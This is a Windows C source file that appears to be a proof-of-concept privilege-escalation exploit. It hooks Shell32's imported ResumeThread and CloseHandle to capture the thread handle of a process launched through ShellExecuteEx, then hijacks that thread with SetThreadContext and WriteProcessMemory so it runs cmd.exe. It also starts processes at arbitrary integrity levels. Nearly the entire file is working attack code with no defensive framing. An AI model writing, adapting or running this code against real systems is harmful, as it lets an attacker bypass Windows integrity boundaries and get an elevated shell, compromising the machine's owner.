#define _WIN32_WINNT 0x0600
#define UNICODE

#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include <stdlib.h>
#include <string.h>

HANDLE Thread;

DWORD
WINAPI
MyResumeThread(
	HANDLE hThread
	)
{
	if (!Thread)
	{
		Thread = hThread;

		wprintf(L"Fooled shell32 DLL\n");

		wprintf(L"Thread = %p\n", Thread);

		return TRUE;
	}

	return ResumeThread(hThread);
}

BOOL
WINAPI
MyCloseHandle(
	HANDLE hObject
	)
{
	if (hObject == Thread)
	{
		wprintf(L"Fooled shell32 DLL (2)\n");
		return TRUE;
	}

	return CloseHandle(hObject);
}

HANDLE
DuplicateTokenToPrimary(
	HANDLE Process
	)
{
	HANDLE MyToken, NewToken;

	if (!OpenProcessToken(
		Process,
		TOKEN_DUPLICATE,
		&MyToken))
		return 0;

	if (!DuplicateTokenEx(
		MyToken,
		TOKEN_ALL_ACCESS,
		0,
		SecurityImpersonation,
		TokenPrimary,
		&NewToken))
		NewToken = 0;

	CloseHandle(MyToken);

	return NewToken;
}

HANDLE
CreateProcessWithShellExecute(
	WCHAR *CmdLine
	)
{
	SHELLEXECUTEINFOW ExecInfo;

	ZeroMemory(
		&ExecInfo,
		sizeof(ExecInfo));

	ExecInfo.cbSize          = sizeof(ExecInfo);
	ExecInfo.fMask           = SEE_MASK_NOCLOSEPROCESS;
	ExecInfo.lpVerb          = L"open";
	ExecInfo.lpFile          = CmdLine;
	ExecInfo.nShow           = SW_SHOW;

	PULONG_PTR p;
	PVOID pResumeThread;
	PVOID pCloseHandle;

	p             = (PULONG_PTR)GetModuleHandle(L"Shell32.dll");
	pResumeThread = (PVOID)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "ResumeThread");
	pCloseHandle  = (PVOID)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "CloseHandle");

	if (p)
	{
		DWORD   OldProt;
		ULONG   i;
		BOOLEAN Found;

		Found = FALSE;

		i = 0;

		while (i < 1024*1024*12)
		{
			if (*p == (ULONG_PTR)pResumeThread)
			{
				VirtualProtect(p, sizeof(ULONG_PTR), PAGE_READWRITE, &OldProt);

				*p = (ULONG_PTR)MyResumeThread;

				VirtualProtect(p, sizeof(ULONG_PTR), OldProt, &OldProt);

				Found = TRUE;
				break;
			}

			i += sizeof(ULONG_PTR);
			p++;
		}

		if (!Found)
		{
			wprintf(L"Couldn't find patch target...\n");
		}

		i = 0;

		while (i < 1024*1024*12)
		{
			if (*p == (ULONG_PTR)pCloseHandle)
			{
				VirtualProtect(p, sizeof(ULONG_PTR), PAGE_READWRITE, &OldProt);

				*p = (ULONG_PTR)MyCloseHandle;

				VirtualProtect(p, sizeof(ULONG_PTR), OldProt, &OldProt);

				Found = TRUE;
				break;
			}

			i += sizeof(ULONG_PTR);
			p++;
		}

		if (!Found)
		{
			wprintf(L"Couldn't find patch target...\n");
		}
		else
		{
			wprintf(L"\nFinished with patching\n");
		}

		/*
		VirtualProtect(p, 3, PAGE_READWRITE, &OldProt);

		SIZE_T Written;

		if (WriteProcessMemory(GetCurrentProcess(), p, "\xc2\x04\x00", 3, &Written) && Written == 3)
		{
			wprintf(L"\nFinished with patching\n");
		}

		VirtualProtect(p, 3, OldProt, &OldProt);
		*/
	}

	//
	// We'll use ShellExecuteEx so that the Appinfo service gets the RPC
	// request and does the magic.
	//

	if (!ShellExecuteExW(&ExecInfo))
	{
		wprintf(L"ShellExecuteEx failed: %lu\n",
			GetLastError());
		return 0;
	}

	return ExecInfo.hProcess;
}

BOOLEAN
CreateProcessWithIntegrity(
	WCHAR *CmdLine,
	ULONG Integrity
	)
{
	PSID                     Sid;
	TOKEN_MANDATORY_LABEL    TokenLabel;
	HANDLE                   Token;
	SID_IDENTIFIER_AUTHORITY MandatoryLabelAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;

	if (!AllocateAndInitializeSid(
		&MandatoryLabelAuthority,
		1,
		Integrity,
		0,
		0,
		0,
		0,
		0,
		0,
		0,
		&Sid))
	{
		wprintf(L"Failed to create SID - %lu\n", GetLastError());
		return FALSE;
	}

	TokenLabel.Label.Sid         = Sid;
	TokenLabel.Label.Attributes  = SE_GROUP_INTEGRITY | SE_GROUP_INTEGRITY_ENABLED;

	STARTUPINFO         si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	Token = DuplicateTokenToPrimary(GetCurrentProcess());

	if (!Token)
	{
		wprintf(L"Failed to duplicate my token to primary\n");
		FreeSid(Sid);
		return FALSE;
	}

	if (!SetTokenInformation(
		Token,
		TokenIntegrityLevel,
		&TokenLabel,
		sizeof(TOKEN_MANDATORY_LABEL)))
	{
		wprintf(L"Failed to set integrity level mandatory label - %lu\n",
			GetLastError());
		CloseHandle(Token);
		FreeSid(Sid);
		return FALSE;
	}

	if (!CreateProcessAsUser(
		Token,
		0,
		CmdLine,
		0,
		0,
		FALSE,
		CREATE_NEW_CONSOLE,
		0,
		0,
		&si,
		&pi))
	{
		wprintf(L"Failed to create process - %lu (%s)\n",
			GetLastError(),
			CmdLine);
		CloseHandle(Token);
		FreeSid(Sid);
		return FALSE;
	}

	CloseHandle(Token);
	FreeSid(Sid);

	wprintf(L"Created process - pid %lu, tid %lu\n",
		pi.dwProcessId,
		pi.dwThreadId);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return TRUE;
}

ULONG
LaunchShellFromProcess(
	HANDLE hProcess,
	CONST CHAR *CmdLine
	)
{
	PVOID   pWinExec;
	PVOID   pExitThread;
	HMODULE Kernel32;
	CONTEXT ThrContext;
	DWORD   ThreadId;
//	HANDLE  Thread;
	UCHAR   InjStack[ 1024 ];
	ULONG   InjStackLength;
	PCHAR   RemoteCmdLine;
	PVOID   RemoteStack;
	SIZE_T  Transferred;
	HANDLE  Token;
	HANDLE  RemoteToken;

	Kernel32 = GetModuleHandle(L"Kernel32.dll");

	if (!Kernel32)
		return 0;

	pWinExec = (PVOID)GetProcAddress(Kernel32, "WinExec");

	if (!pWinExec)
		return 0;

	pExitThread = (PVOID)GetProcAddress(Kernel32, "ExitThread");

	if (!pExitThread)
		return 0;

	//
	// Let's create our remote thread ...
	//

	if (!Thread)
	{
		wprintf(L"Trying to create thread...\n");

		Thread = CreateRemoteThread(
			hProcess,
			0,
			0,
			(LPTHREAD_START_ROUTINE)pExitThread,
			0,
			CREATE_SUSPENDED,
			&ThreadId);

		if (!Thread)
		{
			wprintf(L"CreateRemoteThread fails, %lu\n",
				GetLastError());
			return 0;
		}
	}

	LDT_ENTRY ldt;

	if (!GetThreadSelectorEntry(
		Thread,
		0x53,
		&ldt))
	{
		wprintf(L"GetThreadSelectorEntry fails, %lu\n",
			GetLastError());
	}

	//
	// NOTE: If we're a Wow64 process, this will fail, because the Wow64
	// implementation of GetThreadContext / SetThreadContext tries to open its
	// own process handle, which fails due to integrity level differences.  We
	// can work around this by 1) patching the main process image entrypoint,
	// and then resuming, 2) queuing an APC, 3) calling the 64-bit system call
	// directly from a Wow64 process, thereby bypassing the Wow64 layer.
	//
	// For more information, see: http://www.nynaeve.net/?p=129
	//

	ThrContext.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(Thread, &ThrContext))
	{
		wprintf(L"GetThreadContext fails, %lu\n", GetLastError());

		getc(stdin);

		TerminateThread(Thread, 0);
		CloseHandle(Thread);

		return 0;
	}

#ifdef _M_IX86
	ThrContext.Eip  = (ULONG)pWinExec;
	ThrContext.Esp -= 1024;

	RemoteCmdLine = (PCHAR)(ThrContext.Esp + 512);
	RemoteStack   = (PVOID)(ThrContext.Esp      );


	*(PULONG)(InjStack + 0x00) = (ULONG)0; // ExitThread...
	*(PULONG)(InjStack + 0x00) = (ULONG)0; 
	*(PULONG)(InjStack + 0x08) = (ULONG)pExitThread; // Ret for WinExec
	*(PULONG)(InjStack + 0x0c) = (ULONG)RemoteCmdLine;
	*(PULONG)(InjStack + 0x10) = SW_SHOW;

	ThrContext.Esp += 0x08;

	InjStackLength = 0x14;

#else
	ThrContext.Rip  = (ULONG64)pWinExec;
	ThrContext.Rsp -= 1024;

	RemoteCmdLine = (PCHAR)(ThrContext.Rsp + 512);
	RemoteStack   = (PVOID)(ThrContext.Rsp      );

	ThrContext.Rcx  = (ULONG64)RemoteCmdLine;
	ThrContext.Rdx  = (ULONG64)SW_SHOW;

	*(PULONG64)(InjStack + 0x00) = (ULONG64)pExitThread; // Ret for WinExec

	InjStackLength = 0x8;

#endif

#if 0
	Token = DuplicateTokenToPrimary(
		hProcess);

	if (!Token)
	{
		wprintf(L"Failed to duplicate token (%lu)\n", GetLastError());

		getc(stdin);
	}
	else
	{
		if (!DuplicateHandle(
			GetCurrentProcess(),
			Token,
			hProcess,
			&RemoteToken,
			0,
			FALSE,
			DUPLICATE_SAME_ACCESS))
		{
			wprintf(L"DuplicateToken fails (%lu)\n",
				GetLastError());
		}
		else
		{
			PVOID p = VirtualAllocEx(
				hProcess,
				0,
				4096,
				MEM_COMMIT,
				PAGE_READWRITE);

			if (p)
			{
				WriteProcessMemory(
					hProcess,
					p,
					&RemoteToken,
					sizeof(HANDLE),
					&Transferred);

				wprintf(L"%p at %p\n",
					RemoteToken,
					p);

				getc(stdin);
			}
		}

		CloseHandle(Token);
	}
#endif

	if (!WriteProcessMemory(
		hProcess,
		RemoteStack,
		InjStack,
		InjStackLength,
		&Transferred))
	{
		wprintf(L"WriteProcessMemory(Stack) fails - %lu\n", GetLastError());

		TerminateThread(Thread, 0);
		CloseHandle(Thread);

		return 0;
	}

	if (!WriteProcessMemory(
		hProcess,
		RemoteCmdLine,
		CmdLine,
		(strlen(CmdLine) + 1) * sizeof(char),
		&Transferred))
	{
		wprintf(L"WriteProcessMemory(Stack) fails - %lu\n", GetLastError());

		TerminateThread(Thread, 0);
		CloseHandle(Thread);

		return 0;
	}

	if (!SetThreadContext(
		Thread,
		&ThrContext))
	{
		wprintf(L"SetThreadContext fails - %lu\n", GetLastError());

		TerminateThread(Thread, 0);
		CloseHandle(Thread);

		return 0;
	}

	wprintf(L"OK - resuming\n");

	if (!ResumeThread(Thread))
	{
		wprintf(L"ResumeThread fails\n");

		TerminateThread(Thread, 0);
	}

	WaitForSingleObject(Thread, 60000);
	TerminateThread(Thread, 0);
	CloseHandle(Thread);

	wprintf(L"Done\n");

	return 1;
}

int
__cdecl
wmain(
	int ac,
	wchar_t **av
	)
{
	if (ac == 3)
	{
		CreateProcessWithIntegrity(
			av[2],
			wcstoul(av[1], 0, 0)
			);
	}
	else if (ac == 2)
	{
		HANDLE hProcess;

		hProcess = CreateProcessWithShellExecute(
			av[1]);

		if (hProcess)
		{
			wprintf(L"Created via ShellExecute - hProcess %p\n",
				hProcess);

			getc(stdin);

			PVOID p;

			p = VirtualAllocEx(
				hProcess,
				0,
				4096,
				MEM_COMMIT,
				PAGE_EXECUTE_READWRITE);

			if (!p)
			{
				wprintf(L"VirtualAllocEx error - %lu\n",
					GetLastError());
			}
			else
			{
				wprintf(L"%p\n", p);
			}

			UCHAR Page[ 4096 ];
			SIZE_T Transferred;

			Transferred = 0;

			memset(Page, 0xAA, sizeof ( Page ));

			if (!WriteProcessMemory(
				hProcess,
				(LPVOID)p,
				Page,
				sizeof( Page ),
				&Transferred))
			{
				wprintf(L"WriteProcessMemory error - %lu\n",
					GetLastError());
			}

			if (!ReadProcessMemory(
				hProcess,
				(LPVOID)p,
				Page,
				sizeof( Page ),
				&Transferred))
			{
				BOOL Retry;

				Retry = (GetLastError() == ERROR_ACCESS_DENIED);

				wprintf(L"ReadProcessMemory error - %lu (Transferred : %lu)\n",
					GetLastError(), Transferred);

				if (Retry)
				{
					wprintf(L"Any key to retry . . .\n");

					getc(stdin);

					PVOID pv = GetModuleHandle(L"Kernel32.dll");

					__debugbreak();

					if (!ReadProcessMemory(
						hProcess,
						pv,
						Page,
						sizeof( Page ),
						&Transferred))
					{
						wprintf(L"ReadProcessMemory error - %lu\n",
							GetLastError());
					}
					else
					{
						wprintf(L"OK on retry for ReadProcessMemory - %lu bytes transferred\n",
							Transferred);
					}
				}
			}
			else
			{
				wprintf(L"Transferred %lu bytes from remote address space!\n",
					(ULONG)Transferred);

				if (Page [ 0 ] == 0xAA)
				{
					wprintf(L"Read/Write VM successful...\n");
				}
			}

			MEMORY_BASIC_INFORMATION mbi;
			SIZE_T len;

			wprintf(L"VirtualQueryEx - %x\n", ( len = VirtualQueryEx(
				hProcess,
				(LPCVOID)0x100000,
				&mbi,
				sizeof(MEMORY_BASIC_INFORMATION))) );

			if (!len)
				wprintf(L"LastError - %lu\n", GetLastError());
			else
			{
				wprintf(L"VirtualQueryEx reports a region of size %lu with protection %lx...\n",
					mbi.RegionSize,
					mbi.Protect);
			}

			DWORD pid;

			wprintf(L"GetProcessId - %x\n", ( pid = GetProcessId(hProcess)) );

			if (!pid)
				wprintf(L"LastError - %lu\n", GetLastError());

			LaunchShellFromProcess(hProcess,
				"C:\\Windows\\System32\\cmd.exe");

			getc(stdin);

			return 0;
		}
	}


	getc(stdin);

	return 0;
}
